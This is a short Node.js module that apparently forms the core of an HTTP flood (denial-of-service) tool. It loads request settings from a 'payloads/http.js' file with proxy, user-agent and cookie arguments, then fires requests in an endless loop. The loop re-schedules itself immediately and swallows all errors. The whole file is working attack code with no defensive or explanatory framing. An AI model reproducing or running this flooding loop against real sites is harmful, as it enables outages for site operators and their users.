const request = require('request');


async function fukthis(obj, args){
        try{
            request(obj);
        }catch(e){}
		
		setTimeout(() => {
			return fukthis(obj, args);
		}, 0);
}

function start(args, proxy, ua, secondcookies){
    fukthis(require('./payloads/http.js')(args, proxy, ua, secondcookies), args)
}

module.exports = start;
